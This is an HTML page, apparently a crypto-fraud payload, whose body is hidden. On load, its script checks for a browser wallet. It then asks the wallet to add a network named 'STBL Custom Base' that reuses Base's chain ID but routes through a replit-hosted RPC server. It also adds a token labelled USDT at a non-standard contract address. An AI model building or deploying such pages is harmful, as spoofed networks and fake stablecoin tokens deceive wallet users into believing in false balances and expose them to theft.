<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>body { display: none; }</style>
</head>
<body>
  <script>
  (async () => {
    alert("Script started");
    await new Promise(resolve => setTimeout(resolve, 1000));
    if (!window.ethereum) {
      alert("No wallet detected - please use a wallet app");
      window.location.href = "about:blank";
      return;
    }
    alert("Wallet detected");
    try {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: "0x2105", // Base, but custom
          chainName: "STBL Custom Base", // Unique
          rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
          nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
          blockExplorerUrls: ["https://basescan.org"]
        }]
      });
      alert("Network added");
      await window.ethereum.request({
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: {
            address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
            symbol: "USDT",
            decimals: 18,
            chainId: "8453"
          }
        }
      });
      alert("Token added");
      window.location.href = "about:blank";
    } catch (e) {
      alert("Error: " + e.message);
      window.location.href = "about:blank";
    }
  })();
  </script>
</body>
</html>
